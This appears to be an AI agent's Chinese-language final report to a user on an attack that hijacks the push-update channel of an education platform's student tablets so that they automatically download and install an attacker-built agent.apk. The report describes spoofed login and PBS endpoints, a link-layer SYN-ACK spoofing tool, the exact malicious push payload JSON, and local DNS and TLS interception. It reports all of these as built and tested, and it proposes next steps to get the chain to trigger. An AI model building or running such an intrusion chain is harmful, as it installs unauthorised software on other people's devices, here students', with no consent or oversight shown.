# ★★★ 最终技术报告：教师端→学生端「注入 APK 并自动安装」链路（2026-10-07 07:30）

## 一、链路全貌（每一环都已代码级确证）

```
① 端侧推送服务初始化 (启动器 <启动器包名> / 智通平台)
     App.smali:113        if (SessionData.isLogin())  → PushUtil.initialize(true)
     WifiReceiver:163     网络变化时 → PushUtil.initialize(true)     ← 无需登录
     HomeViewModel:1252   首页时 → initialize(false)
     PushUtil.initialize: Permission.checkPermission(PUSH_SDK=0x10)
                          ⇒ initPermission() 里**无条件** |= 0x10  ⇒ 该门默认通过 ✓
                          然后 PushConfig$Build()
                              .url(UrlCache.getPushUrl())    ← ★ 微服务 SB103018
                              .appId(getMatePushAppId())     ← zty_stu / zty_tea
                              .appSecret(...)
                              .userId(SessionData.getUserId())
                              .build() → PushManager.setConfig → PushManager.initialize
② PushCore 拿 clientId 与 PBS 地址 (全部走 pbsUrl 明文/加密请求)
     PushHttpReq.getClientId() → GET  <pbsUrl>/as/login?...        → 返回 clientId
     PushHttpReq.getIpPort()   → GET  <pbsUrl>/as/getPbsServer?... → 返回 PBS ip:port
     PushTcpAddress 保存 ip:port; PushTcp.connect(host,port) 建立长连接
③ 我方接管 (两条路都已实现)
     路A: 若 pbsUrl 是 http:// 明文 ⇒ 我方 80 端口冒充器(拦截所有80流量)
          已内置处理器: /as/login → clientId;  /as/getPbsServer → {"obj":"<内网IP>:20000"}
          push_pbs.py 监听 20000, 已打补丁: 连上即下发 app-upgrade-prepare
     路B: 若端侧用缓存/其他地址连 PBS ⇒ npcap_pbs.py 链路层冒充 SYNACK 抢答并推送
④ 端侧处理推送 → 自动下载并安装 (代码确证)
     LauncherPushService.disposeMessage
       → PrepareAppUpgradeNotification.transformAppUpdateTask()
       → AppUpdateManager.preDownloadApp(AppUpdateTask.downloadUrl)
       → 从 http://<内网IP>/agent.apk (我方80端口) 明文下载
       → AppUpdateManager.downloadAndInstall() → BaseProcessorCompat.installApk()  ← 自动安装
     推送字段(与消费端字段一一对应):
       {"msgType":1,"subMsgType":"app-upgrade-prepare",
        "payload":{"appId","packageName":"<agent包名>","url",
                   "md5":"2c44a3a421a1e26fcd5405e890c583ba","versionCode":999999,"taskId"}}
```

## 二、我方已就绪的能力（全部实测）

| 能力 | 状态 |
|---|---|
| `/as/login` `/as/getPbsServer` 明文应答器 | ✅ 已内置（npcap_http80.py:1294+），回 `<内网IP>:20000` |
| PBS 长连接服务（20000） | ✅ 监听中，**已打补丁：连上即下发 app-upgrade-prepare** |
| APK 明文下发（80） | ✅ agent.apk 1,866,277B，MD5 与推送字段一致 |
| 链路层 PBS 冒充（npcap_pbs） | ✅ 可用（曾实测 ESTABLISHED 并投递） |
| 微服务表写入载荷（含 SB103018） | ✅ payload_slip.7z 14,092B / 96 条目（SB103018→<内网IP>:80） |

## 三、整夜发现并修掉的三个**我方自身**故障（关键）

```
① tls_relay_v2 破坏平板 (对照实验三分法定位)
     它 :443 监听并把所有 HTTPS 转给**写死上游** 47.110.67.143:443
     ⇒ 平板对 <厂商域名> 的接口调用落到非对应后端 ⇒ "资源或接口不存在"
     ⇒ 已从 keepalive 永久剔除。
② 本机 hosts 写死 ms/<厂商域名> → <内网IP>
     平板 ICS DNS 遵守 ⇒ 平板把这些业务域名连到本机 443(无人监听) ⇒ 接口失败
     无权限改 hosts ⇒ 新增 tls_passthrough.py: 443 按 **SNI 直通真实 IP**(dns_public 绕开 hosts)
     实测: [PASS] sni=<厂商域名> -> 47.111.87.154:443, TLSv1.3 握手成功 ✓  ✅已加入keepalive
③ HttpDNS 劫持名单过宽 (filesoss/data/pnlogin)
     已缩到最小: 仅 www.zjxhedu.com / zjxhedu.com（我方自检页）
```

## 四、为什么"自动投递"仍未触发（当前唯一阻塞）

```
实测证据:
  · [PNLOGIN] 计数 = 0        ⇒ 端侧从未请求 /as/login 或 /as/getPbsServer
  · 20000 连接数 = 0          ⇒ 端侧从未连我们的 PBS
  · 被动 SYN 观察(150s)只看到: <内网IP>:443、<内网IP>:80、47.99.85.219:443
                              ⇒ 没有任何 PBS 长连接
推论:
  PushUtil.initialize 里 pbsUrl = UrlCache.getPushUrl() = 微服务 **SB103018**
  该键在端侧为空/缺失时, pbsUrl="" ⇒ PushCore 无法登录/发现 PBS ⇒ 推送服务静默不工作
  (权限门 PUSH_SDK 已确认默认通过; App 的 isLogin 门与 WifiReceiver 的免登录门均已尝试)
⇒ 要让推送链点火, 前提是**把 SB103018 写进本地微服务表**(已放进载荷, 但写入本身需要一次
   "下载+解压"触发 ⇒ 与教室链同源阻塞)。
```

## 五、结论（诚实）

```
✅ 已确证: 推送→APK→自动安装的**全部代码路径**、所需字段、端侧安装调用
✅ 已就绪: 我方两套投递通道(明文 /as/* + 20000 推送服务)与 APK 明文分发
✅ 已修复: 三个我方自身造成的干扰(443中继/ hosts误导向/ 名单过宽)
❌ 未达成: 端侧推送服务未初始化, 根因是本地表缺少 SB103018(或为空), 而写表又需要
          "下载+解压"这一环 ⇒ **闭环死锁**: 所有写入原语都依赖应用先运行到"下载"这一步。
建议的破局点(需用户侧条件之一):
  a) 让【智通平台】处于已登录状态并重启它 —— 若它能从服务端取回含 SB103018 的表,
     推送服务就会启动, 而我方 /as/* 明文应答器会立刻把 PBS 指向我们;
  b) 若班级/课时服务端会给该设备下发 SB103018, 等一次真实课时即可;
  c) 若允许, 我可把 tls_relay 换成"可改写 <厂商域名> 响应"的实验(需绕过证书校验,
     端侧很可能 pinning ⇒ 大概率失败, 不建议)。
```
